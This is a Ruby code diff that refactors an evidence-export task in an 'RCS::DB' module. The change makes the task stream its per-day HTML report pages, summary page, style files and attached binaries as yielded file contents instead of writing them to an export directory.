@@ -6,7 +6,7 @@ module RCS
 module DB
 
 class EvidenceTask
-  include RCS::DB::SingleFileTaskType
+  include RCS::DB::MultiFileTaskType
   include RCS::Tracer
 
   def internal_filename
@@ -24,8 +24,8 @@ class EvidenceTask
 
     evidence = ::Evidence.filter @params
 
-    export(evidence, index: :da, target: @params['filter']['target']) do
-      yield
+    export(evidence, index: :da, target: @params['filter']['target']) do |type, filename, opts|
+      yield type, filename, opts
     end
 
     yield @description = "Ended"
@@ -118,7 +118,7 @@ class EvidenceTask
     # expand all the metadata
     row[:data].each_pair do |k, v|
       next if ['_grid', '_grid_size', 'md5', 'type'].include? k
-      v.gsub! /\n/, '<br>'
+      v.gsub! /\n/, '<br>' if v.class == String
       table += "<tr><td class=\"inner\">#{k}</td><td class=\"inner\">#{v}</td></tr>"
     end
     # add binary content
@@ -152,7 +152,7 @@ class EvidenceTask
     table
   end
 
-  def html_image(image, size=80)
+  def html_image(image, size=140)
     <<-eof
     <a href="#{image}"><img src="#{image}" height="#{size}" ></a>
     eof
@@ -168,17 +168,17 @@ class EvidenceTask
   end
 
   def begin_new_file(day)
-    FileUtils.mkdir_p File.join(@export_dir, day)
-    out = File.open(File.join(@export_dir, day, 'index.html'), 'wb+')
-    out.write html_page_header
-    out.write html_evidence_table_header day
+    out = {}
+    out[:name] = File.join(day, 'index.html')
+    out[:content] = html_page_header
+    out[:content] += html_evidence_table_header day
+
     return out
   end
 
   def end_file(out)
-    out.write html_table_footer
-    out.write html_page_footer
-    out.close
+    out[:content] += html_table_footer
+    out[:content] += html_page_footer
   end
 
   def dump_file(day, evidence, target)
@@ -192,40 +192,39 @@ class EvidenceTask
       when 'file'
         name += File.extname evidence[:data]['path']
     end
-    File.open(File.join(@export_dir, day, name), 'wb+') {|f| f.write file.read}
+    return File.join(day, name), file.read
   end
 
   def create_summary(summary)
-    File.open(File.join(@export_dir, "index.html"), 'wb+') do |f|
-      f.write html_page_header
-      f.write html_summary_table_header
+    out = {}
+    out[:name] = 'index.html'
+    out[:content] = html_page_header
+    out[:content] += html_summary_table_header
 
-      summary.each_pair do |k,v|
-        f.write html_summary_table_row date: k, num: v
-      end
-
-      f.write html_table_footer
-      f.write html_page_footer
+    summary.each_pair do |k,v|
+      out[:content] += html_summary_table_row date: k, num: v
     end
+
+    out[:content] += html_table_footer
+    out[:content] += html_page_footer
+
+    return out
   end
 
   def expand_styles
     Zip::ZipFile.open(Config.instance.file('export.zip')) do |z|
       z.each do |f|
-        f_path = File.join(@export_dir, f.name)
-        FileUtils.mkdir_p(File.dirname(f_path))
-        z.extract(f, f_path) unless File.exist?(f_path)
+        yield f.name, z.file.open(f.name, "rb") { |c| c.read }
       end
     end
   end
 
   def export(evidence, opts)
 
-    # set the output dir
-    @export_dir = 'export'
-
     # expand the sytles in the dest dir
-    expand_styles
+    expand_styles do |name, content|
+      yield 'stream', name, {content: content}
+    end
 
     # the current file handler
     out = nil
@@ -253,6 +252,10 @@ class EvidenceTask
       if file_day != day
         # close any pending file / table
         end_file out
+
+        # store the file
+        yield 'stream', out[:name], {content: out[:content]}
+
         # create a new file
         out = begin_new_file day
         # remember the day of the file for the next iteration
@@ -263,10 +266,15 @@ class EvidenceTask
       e[:agent] = ::Item.find(e[:aid]).name
 
       # write the current evidence
-      out.write html_evidence_table_row e
+      out[:content] += html_evidence_table_row e
 
       # export the binary file
-      dump_file(day, e, opts[:target]) if e[:data]['_grid']
+      if e[:data]['_grid']
+        filename, content = dump_file(day, e, opts[:target])
+        yield 'stream', filename, {content: content}
+      else
+        yield
+      end
 
       # update the stat of the summary
       summary[day][hour] +=  1
@@ -274,14 +282,14 @@ class EvidenceTask
       # this is the last element
       if i == evidence.length - 1
         end_file out
+        yield 'stream', out[:name], {content: out[:content]}
       end
-
-      # give control to the caller
-      yield
-
     end
 
-    create_summary summary
+    # create the total summary of the exported evidence
+    out = create_summary summary
+    yield 'stream', out[:name], {content: out[:content]}
+
   end
 
 end
